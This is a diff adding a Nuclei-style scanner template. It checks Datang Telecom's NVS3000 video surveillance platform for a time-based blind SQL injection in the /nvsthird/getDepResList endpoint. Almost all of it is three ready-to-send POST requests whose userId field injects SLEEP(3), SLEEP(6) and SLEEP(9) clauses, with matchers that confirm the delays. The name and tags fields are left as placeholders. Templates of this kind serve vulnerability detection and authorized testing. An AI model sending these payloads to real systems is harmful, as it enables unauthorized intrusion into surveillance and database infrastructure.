@@ -1,0 +1,54 @@
+id: datang-NVS3000-getDepResList-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 大唐电信科技股份有限公司NVS3000综合视频监控平台 /nvsthird/getDepResList 接口存在SQL注入。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%A4%A7%E5%94%90%E7%94%B5%E4%BF%A1NVS3000%E7%BB%BC%E5%90%88%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0getDepResList%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /nvsthird/getDepResList HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/json
+        Accept-Encoding: gzip, deflate
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.9
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+        Content-Length: 49
+
+        {"userId":"1' AND (SELECT 8845 FROM (SELECT(SLEEP(3)))KRNM) AND 'JWDU'='JWDU"}
+      - |-
+        POST /nvsthird/getDepResList HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/json
+        Accept-Encoding: gzip, deflate
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.9
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+        Content-Length: 49
+
+        {"userId":"1' AND (SELECT 8845 FROM (SELECT(SLEEP(6)))KRNM) AND 'JWDU'='JWDU"}
+      - |-
+        POST /nvsthird/getDepResList HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/json
+        Accept-Encoding: gzip, deflate
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.9
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+        Content-Length: 49
+
+        {"userId":"1' AND (SELECT 8845 FROM (SELECT(SLEEP(9)))KRNM) AND 'JWDU'='JWDU"}
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
